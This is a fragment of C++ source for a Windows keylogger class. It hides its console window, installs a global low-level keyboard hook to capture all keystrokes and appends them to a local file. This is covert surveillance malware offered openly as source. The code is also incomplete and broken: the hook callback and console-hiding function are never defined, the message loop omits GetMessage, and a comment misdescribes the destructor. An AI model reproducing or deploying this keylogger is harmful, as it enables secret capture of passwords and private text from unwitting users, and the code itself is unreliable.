#include <iostream>
#include <windows.h>
// #include <winuser.h> removed that GetAsyncKeyState for efficency 
#include <fstream>

using namespace std;

class Keylogger {
    private:
        ofstream write;
        static HHOOK keyboardHook;
    public:
        // open file in appending mode
        Keylogger(){
            write.open("record.txt", ios::app);
            // hide console on startup
            hideConsole();
        }
        // destructor
        ~Keylogger(){
            if(write.is_open()){
                // close when the object is created
                write.close();
            }
        }
        // logger
        void startlogging(){
            // global keyboard hook in Windows using the Windows API
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger::keyLoggerProc, NULL, 0);
            if(!keyboardHook){
                cout<< "Failed to install hook!" <<endl;
            }
            MSG msg;
            while(&msg, NULL , 0, 0){
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            UnhookWindowsHookEx(keyboardHook);
        }
}
